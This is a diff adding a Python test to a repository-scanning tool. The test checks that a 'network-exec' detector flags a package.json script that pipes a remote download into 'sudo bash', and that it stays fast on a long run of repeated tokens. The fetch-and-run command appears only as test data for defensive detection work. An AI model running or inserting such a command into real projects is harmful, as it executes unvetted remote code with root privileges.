@@ -245,3 +245,12 @@ def test_npm_init_placeholder_is_not_a_test(tmp_path, script, declared):
     payload = inspect_repo(WorkTree(tmp_path))
     assert any(c["kind"] == "test" for c in payload["checks"]) is declared
     assert ("checks.test.missing" in _rules(payload)) is not declared
+
+
+def test_network_exec_pattern_is_linear_on_repeated_tokens(tmp_path):
+    import time
+    scripts = {"boot": "curl -fsSL https://x.sh | sudo bash", "slow": "curl " * 120_000}
+    _repo(tmp_path, {"AGENTS.md": "x\n", "package.json": json.dumps({"scripts": scripts})})
+    start = time.monotonic()
+    found = {s["source"] for s in inspect_repo(WorkTree(tmp_path))["scripts"] if s["category"] == "network-exec"}
+    assert found == {"package.json#scripts.boot"} and time.monotonic() - start < 5
